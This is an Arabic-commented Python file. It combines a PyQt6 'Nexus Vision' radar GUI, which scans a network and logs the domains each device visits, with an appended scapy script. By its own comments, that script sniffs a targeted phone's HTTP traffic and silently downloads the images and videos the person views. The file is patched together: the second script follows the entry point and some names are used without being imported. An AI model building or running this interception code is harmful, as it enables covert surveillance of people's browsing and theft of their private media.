# -*- coding: utf-8 -*-
"""
واجهة المستخدم الأساسية باستخدام PyQt6
تحتوى على واجهة رادار بحجم 420x850 وتأثيرات Glassmorphism
مع أيقونات مرسومة باستخدام QPainterPath (بدون صور خارجية)
كل سطر مشروح باللغة العربية.
"""
from PyQt6 import QtWidgets, QtCore, QtGui
from PyQt6.QtCore import Qt, pyqtSignal, QObject
import math
import threading
from typing import List
from network_engine import Device
from network_engine import precheck_environment
import time


# عامل مساعد لتحويل زاوية إلى مدى -180..180
def _angle_diff(a, b):
    d = (a - b + 180) % 360 - 180
    return abs(d)


class RadarWidget(QtWidgets.QWidget):
    # عنصر رادار مرئي
    device_clicked = pyqtSignal(str)
    def __init__(self, parent=None):
        super().__init__(parent)
        # حجم الرسم الافتراضي كما طُلب
        self.setFixedSize(420, 600)
        # زاوية المسح الحالية
        self.angle = 0.0
        # قائمة الأجهزة التي ستُعرض
        self.devices: List[Device] = []
        # مؤقت لتدوير الرادار وتحديث الحركة
        self.timer = QtCore.QTimer(self)
        self.timer.timeout.connect(self.on_tick)
        self.timer.start(30)  # تحديث ~33 إطار بالثانية للحصول على سلاسة أعظم
        # سرعة دوران الشعاع بالدرجات لكل تحديث
        self.spin_speed = 1.6

    def on_tick(self):
        # تحديث الزاوية وإعادة رسم العنصر
        self.angle = (self.angle + self.spin_speed) % 360.0
        # تدوير أثر الحركة للأجهزة
        for d in self.devices:
            # تحديث مسار الحركة
            d.trail.append((d.x, d.y))
            if len(d.trail) > 8:
                d.trail.pop(0)
            # تحريك بسيط عشوائي لطيف
            # حركة طفيفة سلسة للأجهزة لتعزيز الإحساس بالحركة
            t = time.time() + (hash(d.mac) % 10)
            d.x += math.sin(t * 0.6) * 0.0008
            d.y += math.cos(t * 0.6) * 0.0008
        self.update()

    def set_devices(self, devices: List[Device]):
        # تحديث قائمة الأجهزة المعروضة
        self.devices = devices

    def mousePressEvent(self, event):
        # اختبار الضغط على أيقونة جهاز: نحسب أقرب جهاز إلى موضع النقر
        try:
            pos = event.position()
            px = pos.x()
            py = pos.y()
            rect = self.rect()
            cx = rect.width() / 2
            cy = rect.height() / 2
            radius = min(cx, cy) - 10
            closest = None
            closest_dist = 1e9
            for d in self.devices:
                dx = cx + d.x * radius - px
                dy = cy + d.y * radius - py
                dist = (dx*dx + dy*dy) ** 0.5
                if dist < closest_dist:
                    closest_dist = dist
                    closest = d
            # عتبة النقر الافتراضية (بكسل)
            if closest and closest_dist <= 28:
                try:
                    self.device_clicked.emit(getattr(closest, 'mac', ''))
                except Exception:
                    pass
        except Exception:
            pass

    def paintEvent(self, event):
        # رسم الرادار وكل العناصر
        p = QtGui.QPainter(self)
        p.setRenderHint(QtGui.QPainter.RenderHint.Antialiasing)
        # خلفية شفافة داكنة
        rect = self.rect()
        p.fillRect(rect, QtGui.QColor(10, 10, 14))

        cx = rect.width() / 2
        cy = rect.height() / 2
        radius = min(cx, cy) - 10

        # رسم دوائر الرادار
        pen = QtGui.QPen(QtGui.QColor(80, 200, 255, 80))
        pen.setWidth(1)
        p.setPen(pen)
        for r in range(1, 5):
            p.drawEllipse(QtCore.QPointF(cx, cy), radius * r / 5, radius * r / 5)

        # رسم شعاع المسح مع تدرج سلس
        grad = QtGui.QConicalGradient(cx, cy, -self.angle)
        grad.setColorAt(0.0, QtGui.QColor(0, 255, 200, 180))
        grad.setColorAt(0.6, QtGui.QColor(0, 255, 200, 20))
        brush = QtGui.QBrush(grad)
        p.setBrush(brush)
        p.setPen(Qt.PenStyle.NoPen)
        path = QtGui.QPainterPath()
        path.moveTo(cx, cy)
        path.arcTo(cx - radius, cy - radius, radius * 2, radius * 2, -self.angle, -30)
        path.lineTo(cx, cy)
        p.drawPath(path)

        # رسم الأجهزة كأيقونات مع Motion Trail، مع Boundary Check
        for d in self.devices:
            # إحداثيات منطقية -> بكسل
            px = cx + d.x * radius
            py = cy + d.y * radius
            # حساب بعد النقطة عن المركز
            dx = px - cx
            dy = py - cy
            dist = math.hypot(dx, dy)

            # إذا خرجت الأيقونة عن نصف القطر، نقوم بتقليص الموقع داخل الحدود
            if dist > radius:
                # نحدد الاتجاه ونوجه النقطة إلى على حافة الدائرة
                nx = dx / dist
                ny = dy / dist
                px = cx + nx * radius * 0.98
                py = cy + ny * radius * 0.98
                # نحسب الشفافية بحيث تختفي بنعومة عند الاقتراب من الحافة
                edge_alpha = int(max(0, 220 - (dist - radius) * 300))
            else:
                edge_alpha = 255

            # رسم أثر الحركة
            if d.trail:
                trail_path = QtGui.QPainterPath()
                trail_path.moveTo(cx + d.trail[0][0] * radius, cy + d.trail[0][1] * radius)
                alpha = 200
                for tx, ty in d.trail[1:]:
                    trail_path.lineTo(cx + tx * radius, cy + ty * radius)
                    alpha = max(alpha - 25, 40)
                pen = QtGui.QPen(QtGui.QColor(0, 255, 180, alpha))
                pen.setWidth(2)
                p.setPen(pen)
                p.setBrush(Qt.BrushStyle.NoBrush)
                p.drawPath(trail_path)

            # اختيار أيقونة حسب الشركة
            # اختيار الأيقونة حسب الشركة - أيقونات Vector مفصلة أكثر
            if d.vendor == 'APPLE':
                icon = self._apple_path(20)
                color = QtGui.QColor(255, 255, 255, edge_alpha)
            else:
                icon = self._android_path(20)
                color = QtGui.QColor(100, 255, 120, edge_alpha)

            # تأثير توهج مغناطيسي عندما يمر الشعاع بالقرب من الجهاز
            # نحسب زاوية الجهاز بالنسبة للمركز
            dev_angle = (math.degrees(math.atan2(d.y, d.x)) + 360) % 360
            angle_diff = _angle_diff(self.angle, dev_angle)
            if angle_diff < 6.0:
                # توهج قوي
                glow_color = QtGui.QColor(0, 220, 255, 160)
                glow_radius = 28
                p.setPen(Qt.PenStyle.NoPen)
                p.setBrush(glow_color)
                p.drawEllipse(QtCore.QPointF(px, py), glow_radius, glow_radius)

            p.save()
            p.translate(px, py)
            p.setPen(Qt.PenStyle.NoPen)
            p.setBrush(color)
            p.drawPath(icon)
            p.restore()

    def _apple_path(self, size=18):
        # رسم أيقونة تفاحة بسيطة بواسطة QPainterPath
        path = QtGui.QPainterPath()
        # جسم التفاحة (متطور بقليل ليعطي مظهراً فيكتورياً نظيفاً)
        path.moveTo(-size*0.15, size*0.25)
        path.cubicTo(-size*0.5, size*0.25, -size*0.5, -size*0.1, -size*0.25, -size*0.3)
        path.cubicTo(-size*0.1, -size*0.48, size*0.1, -size*0.48, size*0.25, -size*0.3)
        path.cubicTo(size*0.5, -size*0.1, size*0.5, size*0.25, size*0.15, size*0.25)
        path.cubicTo(size*0.05, size*0.25, 0, size*0.12, -size*0.15, size*0.25)
        # ورقة صغيرة
        leaf = QtGui.QPainterPath()
        leaf.moveTo(size*0.15, -size*0.45)
        leaf.quadTo(size*0.35, -size*0.6, size*0.05, -size*0.55)
        path.addPath(leaf)
        return path

    def _android_path(self, size=18):
        # رسم أيقونة أندرويد مبسطة بواسطة QPainterPath
        path = QtGui.QPainterPath()
        # جسم أندرويد أكثر تفصيلاً
        body = QtCore.QRectF(-size*0.45, -size*0.28, size*0.9, size*0.56)
        path.addRoundedRect(body, size*0.18, size*0.18)
        # عيون/مستشعرات
        path.addEllipse(-size*0.18, -size*0.5, size*0.12, size*0.12)
        path.addEllipse(size*0.06, -size*0.5, size*0.12, size*0.12)
        # تقليم أسفل
        footer = QtGui.QPainterPath()
        footer.moveTo(-size*0.3, size*0.25)
        footer.lineTo(size*0.3, size*0.25)
        path.addPath(footer)
        return path


class ScannerThread(QtCore.QThread):
    # خيط ماسح يُنفّذ المسح بشكل دوري ويرسل إشارات للأجهزة والسجلات
    devices_updated = pyqtSignal(list)
    log = pyqtSignal(str)

    def __init__(self, engine, interval=3.0):
        super().__init__()
        self.engine = engine
        self.interval = interval
        self._running = True

    def run(self):
        # حلقة المسح المتواصلة
        while self._running:
            try:
                # نطلب الفحص دون محاكاة افتراضية لضمان بيانات حقيقية فقط
                devs = self.engine.scan_network(allow_simulation=False)
                # إضافة رسائل يوميات
                for d in devs:
                    name = getattr(d, 'model', '') or d.vendor
                    self.log.emit(f"[{time.strftime('%H:%M:%S')}] Target Locked: {name} ({d.mac})")
                self.devices_updated.emit(devs)
            except Exception as e:
                self.log.emit(f"[{time.strftime('%H:%M:%S')}] Scan Error: {e}")
            self.msleep(int(self.interval * 1000))

    def stop(self):
        self._running = False
        self.wait()


class GlassCircle(QtWidgets.QWidget):
    # دائرة بتأثير Glassmorphism وتوهج عند المرور
    def __init__(self, label: str, parent=None):
        super().__init__(parent)
        self.label = label
        self.setFixedSize(80, 80)
        self.hover = False

    def enterEvent(self, event):
        # عند مرور الماوس
        self.hover = True
        self.update()

    def leaveEvent(self, event):
        # عند مغادرة الماوس
        self.hover = False
        self.update()

    def paintEvent(self, event):
        # رسم الدائرة الزجاجية
        p = QtGui.QPainter(self)
        p.setRenderHint(QtGui.QPainter.RenderHint.Antialiasing)
        rect = self.rect()
        # خلفية شبه شفافة
        gradient = QtGui.QLinearGradient(0, 0, 0, rect.height())
        gradient.setColorAt(0.0, QtGui.QColor(255, 255, 255, 20))
        gradient.setColorAt(1.0, QtGui.QColor(255, 255, 255, 8))
        p.setBrush(QtGui.QBrush(gradient))
        p.setPen(Qt.PenStyle.NoPen)
        p.drawRoundedRect(rect.adjusted(4, 4, -4, -4), 20, 20)

        # توهج عند hover
        if self.hover:
            glow = QtGui.QColor(0, 200, 255, 120)
            p.setBrush(glow)
            p.drawEllipse(rect.center(), 36, 36)

        # كتابة التسمية
        p.setPen(QtGui.QColor(220, 220, 220))
        font = p.font()
        font.setPointSize(9)
        p.setFont(font)
        p.drawText(rect, Qt.AlignmentFlag.AlignCenter, self.label)


class MainWindow(QtWidgets.QMainWindow):
    # النافذة الرئيسية التي تحتوى على الرادار والأزرار
    def __init__(self, engine=None):
        super().__init__()
        self.engine = engine
        self.setWindowTitle('Nexus Vision - العالم الساحر')
        self.setFixedSize(420, 850)

        central = QtWidgets.QWidget()
        self.setCentralWidget(central)
        layout = QtWidgets.QVBoxLayout(central)
        layout.setContentsMargins(10, 10, 10, 10)

        # إضافة رادار
        self.radar = RadarWidget(self)
        layout.addWidget(self.radar, alignment=Qt.AlignmentFlag.AlignHCenter)

        # ربط إشارة النقر على جهاز ليعرض تفاصيله
        try:
            self.radar.device_clicked.connect(self.on_device_clicked)
        except Exception:
            pass

        # صف الأزرار الكبير (Intercept / Kick / Scan) بتصميم نيون
        big_row = QtWidgets.QHBoxLayout()
        self.btn_intercept = QtWidgets.QPushButton('Intercept')
        self.btn_kick = QtWidgets.QPushButton('Kick')
        self.btn_scan = QtWidgets.QPushButton('Scan')
        for b in [self.btn_intercept, self.btn_kick, self.btn_scan]:
            b.setFixedHeight(72)
            b.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
            b.setStyleSheet('''
                QPushButton { font-size:18px; color: #e6f7ff; background: qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 #002b36, stop:1 #003a4d); border-radius:14px; padding:12px; }
                QPushButton:hover { box-shadow: 0px 12px 28px rgba(0,200,255,0.2); background: qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 #003a4d, stop:1 #005a78); }
            ''')
            big_row.addWidget(b)
        layout.addLayout(big_row)

        # توصيل أزرار الوظائف (ملمح آمن فقط - محاكاة)
        self.btn_intercept.clicked.connect(self.intercept_action)
        self.btn_kick.clicked.connect(self.kick_action)
        self.btn_scan.clicked.connect(self.on_scan)

        # صف الدوائر الأربعة بتأثير Glassmorphism (English labels)
        circles_row = QtWidgets.QHBoxLayout()
        for name in ['Navigate', 'Monitor', 'Connect', 'Settings']:
            c = GlassCircle(name)
            circles_row.addWidget(c)
        layout.addLayout(circles_row)

        # شريط علوي لعرض عدد الأجهزة الحالية
        top_row = QtWidgets.QHBoxLayout()
        self.count_label = QtWidgets.QLabel('Devices: 0')
        font = self.count_label.font()
        font.setPointSize(11)
        font.setBold(True)
        self.count_label.setFont(font)
        top_row.addWidget(self.count_label, alignment=Qt.AlignmentFlag.AlignLeft)
        # أزرار نظام أندرويد داخل التطبيق (Back / Home)
        self.btn_back = QtWidgets.QPushButton('◀')
        self.btn_home = QtWidgets.QPushButton('⌂')
        self.btn_back.setFixedSize(36, 28)
        self.btn_home.setFixedSize(36, 28)
        self.btn_back.clicked.connect(self.back_action)
        self.btn_home.clicked.connect(self.home_action)
        top_row.addStretch()
        top_row.addWidget(self.btn_back)
        top_row.addWidget(self.btn_home)
        layout.insertLayout(0, top_row)

        # مساحة مرنة
        layout.addStretch(1)

        # شريط سفلي تفاعلي (navbar) بأزرار إنجليزية
        btn_row = QtWidgets.QHBoxLayout()
        self.btn_nav = QtWidgets.QPushButton('Navigate')
        self.btn_nav.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.btn_nav.setStyleSheet('QPushButton { padding:10px; border-radius:8px; } QPushButton:hover { margin-top:-6px; box-shadow: 0px 8px 20px rgba(0,220,255,0.2); }')
        self.btn_monitor = QtWidgets.QPushButton('Monitor')
        # زر للتحكم بالرصد السلبي (تبديل Start/Stop)
        self._sniffer_running = False
        self.btn_monitor.clicked.connect(self.toggle_sniffer)
        self.btn_connect = QtWidgets.QPushButton('Connect')
        self.btn_settings = QtWidgets.QPushButton('Settings')
        # زر إيقاف الطوارئ (Kill Switch) - يوقف كل خيوط الشبكة فوراً
        self.btn_killswitch = QtWidgets.QPushButton('Kill Switch')
        self.btn_killswitch.setStyleSheet('QPushButton { background:#b22222; color:white; padding:8px; border-radius:6px; }')
        self.btn_killswitch.clicked.connect(self.kill_switch)
        btn_row.addWidget(self.btn_nav)
        btn_row.addWidget(self.btn_monitor)
        btn_row.addWidget(self.btn_connect)
        btn_row.addWidget(self.btn_settings)
        btn_row.addWidget(self.btn_killswitch)
        layout.addLayout(btn_row)

        # إضافة ظل (box-shadow) بسيط لكل زرّ Navbar
        try:
            for b in [self.btn_nav, self.btn_monitor, self.btn_connect, self.btn_settings, self.btn_killswitch]:
                eff = QtWidgets.QGraphicsDropShadowEffect()
                eff.setBlurRadius(10)
                eff.setOffset(0, 4)
                eff.setColor(QtGui.QColor(0, 200, 255, 70))
                b.setGraphicsEffect(eff)
        except Exception:
            pass

        # مؤقت لجلب بيانات من المحرك وتحديث الواجهة
        self.update_timer = QtCore.QTimer(self)
        self.update_timer.timeout.connect(self.pull_engine)
        self.update_timer.start(2000)

    def on_scan(self):
        # زر يطلق عملية مسح فورية في خيط منفصل
        if self.engine:
            # تنفيذ المسح دون محاكاة افتراضية (نريد عدداً فعلياً)
            QtCore.QThreadPool.globalInstance().start(lambda: self.engine.scan_network(allow_simulation=False))

    def toggle_sniffer(self):
        # تبديل تشغيل/إيقاف الرصد السلبي
        if not self.engine:
            return
        if not self._sniffer_running:
            # بدء الرصد السلبي
            started = self.engine.start_passive_sniffer(self._on_sniff_packet)
            if started:
                self._sniffer_running = True
                self.btn_monitor.setText('Stop Monitor')
        else:
            # إيقاف الرصد
            try:
                self.engine.stop_passive_sniffer()
            except Exception:
                pass
            self._sniffer_running = False
            self.btn_monitor.setText('Monitor')

    def intercept_action(self):
        # وضع محاكاة لاعتراض عرضي: يفتح نافذة المراقبة
        QtWidgets.QMessageBox.information(self, 'Intercept', 'Intercept is simulation-only in this build. Opening Monitor.')
        self.open_monitor()

    def kick_action(self):
        # محاكاة ميزة Kick — نعرض تحذيراً ونُجري عدًّا مزيفًا لإظهار الفعالية دون تنفيذ أي حزم
        if not self.engine:
            return
        ok = QtWidgets.QMessageBox.question(self, 'Kick (Simulation)', 'Kick will simulate disconnecting a device. Proceed?')
        if ok != QtWidgets.QMessageBox.StandardButton.Yes:
            return
        # محاكاة تنفيذ عملية الطرد مع رسالة يومية
        QtWidgets.QMessageBox.information(self, 'Kick', 'Simulated deauthentication packets sent (NO PACKETS ACTUALLY SENT).')
        # سجّل حدثاً في ملف السجلات
        try:
            import json
            entry = {'ts': time.strftime('%Y-%m-%d %H:%M:%S'), 'event': 'kick_simulated'}
            logs = []
            if os.path.exists('actions_log.json'):
                with open('actions_log.json', 'r', encoding='utf-8') as f:
                    try:
                        logs = json.load(f)
                    except Exception:
                        logs = []
            logs.append(entry)
            with open('actions_log.json', 'w', encoding='utf-8') as f:
                json.dump(logs, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def on_device_clicked(self, mac: str):
        # عند النقر على أيقونة جهاز - عرض معلومات و خيارات محاكاة
        if not mac:
            return
        # جلب السجلات لهذا الماك
        reqs = []
        try:
            if hasattr(self.engine, 'get_requests_for_device'):
                reqs = self.engine.get_requests_for_device(mac)
        except Exception:
            reqs = []
        txt = f"Device: {mac}\nRecent domains:\n"
        for r in reqs[-8:]:
            txt += f" - {r.get('time')} {r.get('domain')}\n"
        dlg = QtWidgets.QMessageBox(self)
        dlg.setWindowTitle('Device')
        dlg.setText(txt)
        dlg.addButton('Close', QtWidgets.QMessageBox.ButtonRole.AcceptRole)
        dlg.exec()

    def back_action(self):
        # عملية back بسيطة: إن كانت نافذة منبثقة مفتوحة تُغلق، وإلا نفعل لا شيء
        QtWidgets.QMessageBox.information(self, 'Back', 'Back navigation (UI-only).')

    def home_action(self):
        # عملية home تعيد الواجهة للوضع الرئيسي
        QtWidgets.QMessageBox.information(self, 'Home', 'Home (UI-only).')

    def _on_sniff_packet(self, info: dict):
        # يعالج بيانات الحزمة الملتقطة من الرصد السلبي ويحدّث الواجهة
        try:
            # ندمج المصدر مع الأجهزة المعروفة
            src_mac = info.get('src_mac')
            src_ip = info.get('src_ip')
            vendor = None
            if src_mac:
                vendor = get_vendor_from_mac(src_mac)
            # إنشاء Device مؤقت لعرضه
            d = Device(ip=src_ip or '0.0.0.0', mac=src_mac or '00:00:00:00:00:00', vendor=vendor or 'Unknown', x=0.0, y=0.0)
            # لا نضيف أجهزة وهمية — نعرضها فقط إن كانت معلومات فعلية
            with getattr(self.engine, '_lock', threading.Lock()):
                # تحديث أو إضافة الجهاز
                exists = False
                for ex in getattr(self.engine, 'devices', []):
                    if ex.mac == d.mac:
                        exists = True
                        ex.ip = d.ip or ex.ip
                        ex.vendor = d.vendor or ex.vendor
                        break
                if not exists:
                    self.engine.devices.append(d)
            # إرسال تحديث للواجهة على الخيط الرئيسي بطريقة آمنة
            QtCore.QTimer.singleShot(0, lambda: self.on_devices_updated(list(getattr(self.engine, 'devices', []))))
        except Exception:
            pass

    def kill_switch(self):
        # زر أمان: يوقف كل العمليات الشبكية والخيوط
        try:
            if self.engine:
                try:
                    self.engine.stop_passive_sniffer()
                except Exception:
                    pass
                # إيقاف ماسح المسح أيضاً
                # إذا كان هناك مسح منفصل فإنه يجب أن يتوقف هنا (مثال: ScannerThread.stop)
        except Exception:
            pass

    def on_devices_updated(self, devs: List[Device]):
        # تنفذ عند وصول بيانات جديدة من خيط الماسح
        # تحديث عرض الرادار
        self.radar.set_devices(devs)
        # تحديث عداد الأجهزة
        self.count_label.setText(f'Devices: {len(devs)}')
        # حفظ سجل المرور (pipeline) داخل ملف JSON بسيط
        try:
            import json
            entry = {
                'ts': time.strftime('%Y-%m-%d %H:%M:%S'),
                'count': len(devs),
                'devices': [{'ip': d.ip, 'mac': d.mac, 'vendor': d.vendor, 'model': getattr(d, 'model', '')} for d in devs]
            }
            logs = []
            if os.path.exists('scan_log.json'):
                with open('scan_log.json', 'r', encoding='utf-8') as f:
                    try:
                        logs = json.load(f)
                    except Exception:
                        logs = []
            logs.append(entry)
            with open('scan_log.json', 'w', encoding='utf-8') as f:
                json.dump(logs, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def open_monitor(self):
        # فتح شاشة المراقب - تعرض الأجهزة وقوائم النطاقات التي زاروها (قانونية/passive only)
        dlg = QtWidgets.QDialog(self)
        dlg.setWindowTitle('Monitor - Devices & Domains')
        dlg.setFixedSize(560, 600)
        lay = QtWidgets.QVBoxLayout(dlg)

        # شريط أدوات لأزرار Refresh / Delete / Export
        toolbar = QtWidgets.QHBoxLayout()
        btn_refresh = QtWidgets.QPushButton('Refresh')
        btn_delete = QtWidgets.QPushButton('Delete Selected Logs')
        btn_export = QtWidgets.QPushButton('Export All (CSV)')
        toolbar.addWidget(btn_refresh)
        toolbar.addWidget(btn_delete)
        toolbar.addWidget(btn_export)
        lay.addLayout(toolbar)

        tree = QtWidgets.QTreeWidget()
        tree.setHeaderLabels(['IP', 'MAC', 'Vendor / Model', 'Visited Domains'])
        tree.setColumnCount(4)

        def build_tree():
            tree.clear()
            if self.engine:
                with getattr(self.engine, '_lock', threading.Lock()):
                    for d in getattr(self.engine, 'devices', []):
                        ip = d.ip or ''
                        mac = d.mac or ''
                        vendor = (getattr(d, 'model', '') or d.vendor or '')
                        parent = QtWidgets.QTreeWidgetItem([ip, mac, vendor, ''])
                        # جلب domains من engine
                        try:
                            reqs = []
                            if hasattr(self.engine, 'get_requests_for_device'):
                                reqs = self.engine.get_requests_for_device(mac)
                            for r in reqs[-40:]:
                                child = QtWidgets.QTreeWidgetItem(['', '', '', f"{r.get('time')} - {r.get('domain')}"])
                                parent.addChild(child)
                        except Exception:
                            pass
                        tree.addTopLevelItem(parent)

        build_tree()

        lay.addWidget(tree)

        def do_delete_selected():
            itm = tree.currentItem()
            if not itm:
                return
            # إذا العنصر المحدد هو طفل نأخذ والده
            parent = itm
            if itm.parent():
                parent = itm.parent()
            mac = parent.text(1).strip()
            if not mac or not self.engine:
                return
            # تأكيد الحذف
            ok = QtWidgets.QMessageBox.question(dlg, 'Confirm Delete', f'Delete stored domains for {mac}?')
            if ok != QtWidgets.QMessageBox.StandardButton.Yes:
                return
            try:
                if hasattr(self.engine, 'requests_log') and mac.lower() in self.engine.requests_log:
                    del self.engine.requests_log[mac.lower()]
                    # حفظ التغيير
                    try:
                        if hasattr(self.engine, 'save_requests_log'):
                            self.engine.save_requests_log()
                    except Exception:
                        pass
                build_tree()
            except Exception:
                pass

        def do_export_csv():
            if not self.engine:
                return
            fname, _ = QtWidgets.QFileDialog.getSaveFileName(dlg, 'Export Requests CSV', 'requests_export.csv', 'CSV Files (*.csv)')
            if not fname:
                return
            try:
                import csv
                with open(fname, 'w', newline='', encoding='utf-8') as f:
                    w = csv.writer(f)
                    w.writerow(['mac', 'time', 'domain'])
                    for mac, recs in getattr(self.engine, 'requests_log', {}).items():
                        for r in recs:
                            w.writerow([mac, r.get('time'), r.get('domain')])
                QtWidgets.QMessageBox.information(dlg, 'Export', f'Exported to {fname}')
            except Exception as e:
                QtWidgets.QMessageBox.warning(dlg, 'Export Error', str(e))

        btn_refresh.clicked.connect(build_tree)
        btn_delete.clicked.connect(do_delete_selected)
        btn_export.clicked.connect(do_export_csv)

        dlg.exec()

    def pull_engine(self):
        # نسحب الأجهزة الحالية من المحرك ونحدث الرادار
        if self.engine:
            with getattr(self.engine, '_lock', threading.Lock()):
                devices = list(getattr(self.engine, 'devices', []))
            self.radar.set_devices(devices)


if __name__ == '__main__':
    import sys
    app = QtWidgets.QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
import os
import requests
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

# مجلد حفظ الصور والمقاطع المسحوبة
SAVE_PATH = "captured_media"
if not os.path.exists(SAVE_PATH):
    os.makedirs(SAVE_PATH)

def media_sniff_callback(pkt):
    """
    هذه الدالة تفحص كل حزمة بيانات تمر عبر الجوال المستهدف
    تبحث عن روابط الصور والمقاطع وتقوم بتحميلها فوراً
    """
    if pkt.haslayer(Raw):
        try:
            # تحويل البيانات الخام إلى نص للبحث عن الروابط
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # قائمة الامتدادات المستهدفة (صور ومقاطع)
            extensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mov']
            
            if "GET" in payload:
                # استخراج الرابط من حزمة الـ HTTP
                lines = payload.split('\r\n')
                url_path = lines[0].split(' ')[1]
                host = ""
                for line in lines:
                    if line.startswith("Host:"):
                        host = line.split(":")[1].strip()
                
                full_url = f"http://{host}{url_path}"
                
                # التأكد إذا كان الرابط لصورة أو فيديو
                if any(ext in url_path.lower() for ext in extensions):
                    print(f"[*] [FOUND MEDIA]: {full_url}")
                    download_media(full_url)
                    
        except Exception as e:
            pass

def download_media(url):
    """تنزيل الملف المكتشف وحفظه في المجلد"""
    try:
        filename = url.split("/")[-1].split("?")[0]
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            with open(os.path.join(SAVE_PATH, filename), 'wb') as f:
                f.write(r.content)
            print(f"[+] [SAVED]: {filename}")
    except:
        pass

# لتشغيل الاعتراض الهجومي مع السنيفر:
# sniff(filter="tcp port 80", prn=media_sniff_callback, store=0)